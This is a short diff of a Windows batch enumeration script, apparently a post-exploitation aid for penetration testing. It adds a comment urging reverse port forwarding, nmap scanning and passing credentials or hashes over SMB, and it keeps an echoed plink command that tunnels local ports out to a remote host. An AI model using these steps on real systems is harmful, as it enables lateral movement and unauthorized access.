@@ -243,6 +243,7 @@ REM arp -A
 echo.
 
 echo ------- Current connections and listening ports -------
+:: Reverse port forward anything that is not accessible remotely, and run nmap on it. If SMB is available locally, do you have creds or hashes you can pass through it after port forwarding?
 netstat -ano 
 echo.
 echo ------- REVERSE PORT FORWARD MULTIPLE PORTS AT ONCE: plink.exe -l username -pw mysecretpassword -P [port] 10.11.0.108 -R 8080:127.0.0.1:8080 -R 8000:127.0.0.1:8000 -R 443:127.0.0.1:443 ------------
